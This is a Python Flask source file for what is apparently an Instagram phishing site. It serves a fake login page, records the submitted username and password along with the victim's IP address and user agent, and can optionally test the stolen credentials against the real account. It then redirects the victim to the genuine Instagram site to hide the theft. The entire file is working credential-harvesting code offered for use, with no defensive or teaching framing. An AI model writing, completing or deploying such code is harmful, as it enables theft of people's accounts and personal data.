# coding=utf-8
#!/usr/bin/env python3

from flask import Flask, render_template, url_for, request, redirect
from time import strftime
from os import path
from logging import getLogger, ERROR
from libs.helpers import error, info, ask, success, report_account
from libs.ig_login import login_to_account

SETTINGS = {
    "YEAR": strftime("%Y"),
    "REDIRECT_URL": "https://www.instagram.com",
    "TRY_ACCOUNTS": False,
    "PORT": 80
}

website_app = Flask(__name__, static_folder=path.abspath('./libs/templates/static'))

def get_ip(request):
    if request.headers.getlist("X-Forwarded-For"):
        return request.headers.getlist("X-Forwarded-For")[0]
    else:
        return request.remote_addr

@website_app.route("/", methods=["POST", "GET"])
def index():
    if (request.method == "GET"):
        success("{} adresinden ana sayfaya bağlantı yapıldı!".format(get_ip(request)))
        return render_template("load.html")
    
    if (("username" in request.form) and ("password" in request.form)):
        return render_template("index.html", hidden="", year=SETTINGS["YEAR"])

    return render_template("index.html", hidden="hidden", year=SETTINGS["YEAR"])

@website_app.route("/login/", methods=["POST", "GET"])
def login():
    if (request.method != "POST"):
        return redirect("/")
    
    if (("username" not in request.form) or ("password" not in request.form)):
        return redirect("/", code=307)

    username = request.form["username"]
    password = request.form["password"]

    if ((username == "" or username == " ") or (password == "" or password == " ")):
        return redirect("/", code=307)

    if (SETTINGS["TRY_ACCOUNTS"] == False):
        report_account(username, password, get_ip(request), request.user_agent, False)
        return redirect(SETTINGS["REDIRECT_URL"])

    if (login_to_account(username, password)):
        report_account(username, password, get_ip(request), request.user_agent, True)
    else:
        report_account(username, password, get_ip(request), request.user_agent, False)

    return redirect(SETTINGS["REDIRECT_URL"]) 

